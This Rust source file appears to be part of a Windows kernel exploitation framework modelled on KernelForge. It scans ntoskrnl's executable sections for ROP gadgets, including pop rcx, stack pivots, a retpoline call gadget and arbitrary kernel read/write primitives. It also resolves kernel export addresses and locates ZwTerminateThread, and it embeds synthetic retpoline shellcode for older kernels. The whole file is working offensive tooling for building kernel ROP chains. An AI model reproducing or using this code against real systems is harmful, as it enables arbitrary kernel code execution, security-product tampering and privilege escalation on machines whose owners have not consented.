//! ntoskrnl PE scan — gadgets, ZwTerminateThread, export resolver.
//! Follows Cr4sh/KernelForge design.

use std::fs;
use windows_sys::Win32::System::LibraryLoader::*;

/// Synthetic retpoline shellcode — written into a user-allocated executable
/// page on pre-Spectre kernels (Win10 < 1809) where
/// `_guard_retpoline_exit_indirect_rax` doesn't exist in ntoskrnl.
/// Functionally identical to the native gadget:
///   mov rax,[rsp+20h]; mov rcx,[rsp+28h]; mov rdx,[rsp+30h];
///   mov r8,[rsp+38h]; mov r9,[rsp+40h]; add rsp,48h; jmp rax
pub const SYNTHETIC_RETPOLINE: [u8; 32] = [
    0x48, 0x8B, 0x44, 0x24, 0x20, // mov rax, [rsp+20h]
    0x48, 0x8B, 0x4C, 0x24, 0x28, // mov rcx, [rsp+28h]
    0x48, 0x8B, 0x54, 0x24, 0x30, // mov rdx, [rsp+30h]
    0x4C, 0x8B, 0x44, 0x24, 0x38, // mov r8,  [rsp+38h]
    0x4C, 0x8B, 0x4C, 0x24, 0x40, // mov r9,  [rsp+40h]
    0x48, 0x83, 0xC4, 0x48, // add rsp, 48h
    0x48, 0xFF, 0xE0, // jmp rax
];

pub struct Gadgets {
    /// Native retpoline from kernel .text (Win10 1809+).
    /// `None` on pre-Spectre kernels — caller must install synthetic.
    pub retpoline: Option<u64>,
    /// add rsp, 68h; ret
    pub add_rsp_68_ret: u64,
    /// pop rcx; ret
    pub pop_rcx_ret: u64,
    /// mov [rcx], rax; ret
    pub mov_drcx_rax_ret: u64,
    /// bare ret (= mov_drcx_rax_ret + 3, same as original)
    pub ret_gadget: u64,
    /// mov [rcx], rdx; ret — optional, for arbitrary kernel writes
    pub mov_drcx_rdx_ret: Option<u64>,
    /// mov rax, [rcx]; ret — optional, for arbitrary kernel reads
    pub mov_rax_drcx_ret: Option<u64>,
}

struct Sec {
    off: usize,
    sz: usize,
    rva: u64,
}

fn read_pe(kn: &str) -> Option<(Vec<u8>, Vec<Sec>)> {
    let d = fs::read(format!("C:\\Windows\\System32\\{}", kn)).ok()?;
    if d.len() < 0x200 {
        return None;
    }
    let lf = u32::from_le_bytes(d[0x3C..0x40].try_into().ok()?) as usize;
    if u32::from_le_bytes(d[lf..lf + 4].try_into().ok()?) != 0x4550 {
        return None;
    }
    let c = lf + 4;
    let ns = u16::from_le_bytes(d[c + 2..c + 4].try_into().ok()?) as usize;
    let oh = u16::from_le_bytes(d[c + 16..c + 18].try_into().ok()?) as usize;
    let s0 = c + 20 + oh;
    let mut v = Vec::new();
    for i in 0..ns {
        let h = s0 + i * 40;
        if h + 40 > d.len() {
            break;
        }
        let ch = u32::from_le_bytes(d[h + 36..h + 40].try_into().ok()?);
        // executable, non-discardable
        if ch & 0x20000000 == 0 {
            continue;
        }
        if ch & 0x02000000 != 0 {
            continue;
        }
        let vs = u32::from_le_bytes(d[h + 8..h + 12].try_into().ok()?) as usize;
        let vr = u32::from_le_bytes(d[h + 12..h + 16].try_into().ok()?) as u64;
        let ro = u32::from_le_bytes(d[h + 20..h + 24].try_into().ok()?) as usize;
        let rs = u32::from_le_bytes(d[h + 16..h + 20].try_into().ok()?) as usize;
        v.push(Sec {
            off: ro,
            sz: rs.min(vs),
            rva: vr,
        });
    }
    Some((d, v))
}

fn match_sign(data: &[u8], sign: &[u8]) -> bool {
    if data.len() < sign.len() {
        return false;
    }
    for i in 0..sign.len() {
        if sign[i] != 0xFF && sign[i] != data[i] {
            return false;
        }
    }
    true
}

fn find_sign(data: &[u8], secs: &[Sec], sign: &[u8]) -> Option<u64> {
    for s in secs {
        let sl = &data[s.off..s.off + s.sz];
        for i in 0..sl.len().saturating_sub(sign.len()) {
            if match_sign(&sl[i..], sign) {
                return Some(s.rva + i as u64);
            }
        }
    }
    None
}

fn find_exact(data: &[u8], secs: &[Sec], pat: &[u8]) -> Option<u64> {
    for s in secs {
        let sl = &data[s.off..s.off + s.sz];
        for i in 0..sl.len().saturating_sub(pat.len()) {
            if &sl[i..i + pat.len()] == pat {
                return Some(s.rva + i as u64);
            }
        }
    }
    None
}

pub fn find_gadgets(kbase: u64, kn: &str) -> Option<Gadgets> {
    let (d, s) = read_pe(kn)?;

    // _guard_retpoline_exit_indirect_rax — present on Win10 1809+ (Spectre).
    // Returns None on pre-1809; caller installs SYNTHETIC_RETPOLINE fallback.
    let retpoline_sign: &[u8] = &[
        0x48, 0x8b, 0x44, 0x24, 0x20, // mov rax,[rsp+20h]
        0x48, 0x8b, 0x4c, 0x24, 0x28, // mov rcx,[rsp+28h]
        0x48, 0x8b, 0x54, 0x24, 0x30, // mov rdx,[rsp+30h]
        0x4c, 0x8b, 0x44, 0x24, 0x38, // mov r8,[rsp+38h]
        0x4c, 0x8b, 0x4c, 0x24, 0x40, // mov r9,[rsp+40h]
        0x48, 0x83, 0xC4, 0x48, // add rsp,48h
        0x48, 0xFF, 0xE0, // jmp rax
    ];
    let retpoline = find_sign(&d, &s, retpoline_sign).map(|rva| kbase + rva);

    let add_rsp_68 = kbase + find_exact(&d, &s, &[0x48, 0x83, 0xC4, 0x68, 0xC3])?;
    let pop_rcx = kbase + find_exact(&d, &s, &[0x59, 0xC3])?;
    let mov_rva = find_exact(&d, &s, &[0x48, 0x89, 0x01, 0xC3])?;

    // mov [rcx], rdx; ret
    let mov_rcx_rdx = find_exact(&d, &s, &[0x48, 0x89, 0x11, 0xC3]);
    // mov rax, [rcx]; ret
    let mov_rax_rcx = find_exact(&d, &s, &[0x48, 0x8B, 0x01, 0xC3]);

    Some(Gadgets {
        retpoline,
        add_rsp_68_ret: add_rsp_68,
        pop_rcx_ret: pop_rcx,
        mov_drcx_rax_ret: kbase + mov_rva,
        ret_gadget: kbase + mov_rva + 3,
        mov_drcx_rdx_ret: mov_rcx_rdx.map(|r| kbase + r),
        mov_rax_drcx_ret: mov_rax_rcx.map(|r| kbase + r),
    })
}

/// Resolve a kernel export VA by name (uses LoadLibraryEx + GetProcAddress delta).
pub fn export_resolve(kbase: u64, kname: &str, name: &str) -> Option<u64> {
    unsafe {
        let path = format!("C:\\Windows\\System32\\{}\0", kname);
        let h = LoadLibraryExA(path.as_ptr(), std::ptr::null_mut(), 0x01);
        if h.is_null() {
            return None;
        }
        let pn = format!("{}\0", name);
        GetProcAddress(h, pn.as_ptr()).map(|a| kbase + (a as u64 - h as u64))
    }
}

/// Find ZwTerminateThread by Zw stub signature with syscall 0x53.
pub fn find_zw_terminate_thread(kbase: u64, kn: &str) -> Option<u64> {
    let (d, s) = read_pe(kn)?;
    let sign: &[u8] = &[
        0x48, 0x8B, 0xC4, // mov rax, rsp
        0xFA, // cli
        0x48, 0x83, 0xEC, 0x10, // sub rsp, 10h
        0x50, // push rax
        0x9C, // pushfq
        0x6A, 0x10, // push 10h
        0x48, 0x8D, 0x05, 0xFF, 0xFF, 0xFF, 0xFF, // lea rax, KiServiceLinkage
        0x50, // push rax
        0xB8, 0x53, 0x00, 0x00, 0x00, // mov eax, 0x53
        0xE9, 0xFF, 0xFF, 0xFF, 0xFF, // jmp KiServiceInternal
    ];
    Some(kbase + find_sign(&d, &s, sign)?)
}
